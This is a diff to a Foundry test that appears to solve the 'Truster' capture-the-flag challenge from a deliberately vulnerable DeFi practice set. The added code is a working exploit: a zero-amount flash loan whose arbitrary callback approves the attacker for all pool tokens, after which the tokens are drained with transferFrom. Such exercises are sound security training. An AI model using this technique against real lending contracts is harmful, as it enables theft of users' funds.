@@ -37,6 +37,29 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        // doesn't have `borrowAmount` non-zero check
+        // executes external call to `target` address with given `data`
+
+        // 1. increase the `attacker` allowance for `trusterLenderPool` dvt tokens
+        trusterLenderPool.flashLoan(
+            0,
+            address(attacker),
+            address(dvt),
+            abi.encodeWithSelector(
+                dvt.approve.selector,
+                address(attacker),
+                TOKENS_IN_POOL
+            )
+        );
+
+        console.log(
+            "(attacker) allowance after flashLoan ",
+            dvt.allowance(address(trusterLenderPool), attacker)
+        );
+
+        // 2. transfer `trusterLenderPool` dvt tokens to `attacker` address
+        vm.prank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
 
         /** EXPLOIT END **/
         validation();
